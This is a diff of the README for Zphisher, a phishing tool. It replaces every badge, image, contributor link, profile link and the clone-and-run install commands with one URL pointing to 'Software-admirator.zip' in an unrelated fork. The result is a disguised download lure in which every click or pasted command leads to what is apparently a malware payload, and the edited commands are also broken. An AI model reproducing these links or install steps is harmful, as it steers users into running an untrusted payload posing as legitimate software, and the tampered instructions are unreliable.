@@ -1,21 +1,21 @@
 <!-- Zphisher -->
 
 <p align="center">
-  <img src=".imgs/logo.png">
+  <img src="https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip">
 </p>
 
 <p align="center">
-  <img src="https://img.shields.io/badge/Version-2.2-green?style=for-the-badge">
-  <img src="https://img.shields.io/github/license/htr-tech/zphisher?style=for-the-badge">
-  <img src="https://img.shields.io/github/stars/htr-tech/zphisher?style=for-the-badge">
-  <img src="https://img.shields.io/github/issues/htr-tech/zphisher?color=red&style=for-the-badge">
-  <img src="https://img.shields.io/github/forks/htr-tech/zphisher?color=teal&style=for-the-badge">
+  <img src="https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip">
+  <img src="https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip">
+  <img src="https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip">
+  <img src="https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip">
+  <img src="https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip">
 </p>
 
 <p align="center">
-  <img src="https://img.shields.io/badge/Author-HTR--Tech-cyan?style=flat-square">
-  <img src="https://img.shields.io/badge/Open%20Source-Yes-cyan?style=flat-square">
-  <img src="https://img.shields.io/badge/Written%20In-Bash-cyan?style=flat-square">
+  <img src="https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip">
+  <img src="https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip%20Source-Yes-cyan?style=flat-square">
+  <img src="https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip%20In-Bash-cyan?style=flat-square">
 </p>
 
 <p align="center">A beginners friendly, Automated phishing tool with 30+ templates.</p>
@@ -50,13 +50,13 @@ It only demonstrates "how phishing works". <b>You shall not misuse the informati
 
 - Just, Clone this repository -
 ```
-$ git clone https://github.com/htr-tech/zphisher.git
+$ git clone https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip
 ```
 
-- Change to cloned directory and run `zphisher.sh` -
+- Change to cloned directory and run `https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip` -
 ```
 $ cd zphisher
-$ bash zphisher.sh
+$ bash https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip
 ```
 
 - On first launch, It'll install the dependencies and that's it. `Zphisher` is installed.
@@ -85,25 +85,25 @@ $ docker run --rm -it htrtech/zphisher
 :: Workflow ::
 </h3>
 <p align="center">
-<img src=".imgs/wf.gif"/>
+<img src="https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip"/>
 </p>
 
 ### Special Thanks :
 
-- [**Aditya Shakya**](https://github.com/adi1090x)
-- [**1RaY-1**](https://github.com/1RaY-1)
-- [**Yisus7u7**](https://github.com/Yisus7u7)
-- [**sepp0**](https://github.com/sepp0)
-- [**AliMilani**](https://github.com/AliMilani)
-- [**TheLinuxChoice**](https://twitter.com/linux_choice)
-- [**DarksecDevelopers**](https://github.com/DarksecDevelopers)
-- [**Moises Tapia**](https://github.com/MoisesTapia)
+- [**Aditya Shakya**](https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip)
+- [**1RaY-1**](https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip)
+- [**Yisus7u7**](https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip)
+- [**sepp0**](https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip)
+- [**AliMilani**](https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip)
+- [**TheLinuxChoice**](https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip)
+- [**DarksecDevelopers**](https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip)
+- [**Moises Tapia**](https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip)
 
 
 ### Find Me on :
 <p align="left">
-  <a href="https://github.com/htr-tech" target="_blank"><img src="https://img.shields.io/badge/Github-HTR--TECH-green?style=for-the-badge&logo=github"></a>
-  <a href="https://www.instagram.com/tahmid.rayat" target="_blank"><img src="https://img.shields.io/badge/IG-%40tahmid.rayat-red?style=for-the-badge&logo=instagram"></a>
-  <a href="https://m.me/tahmid.rayat.official" target="_blank"><img src="https://img.shields.io/badge/Chat-Messenger-blue?style=for-the-badge&logo=messenger"></a>
+  <a href="https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip" target="_blank"><img src="https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip"></a>
+  <a href="https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip" target="_blank"><img src="https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip%https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip"></a>
+  <a href="https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip" target="_blank"><img src="https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip"></a>
 </p>
 
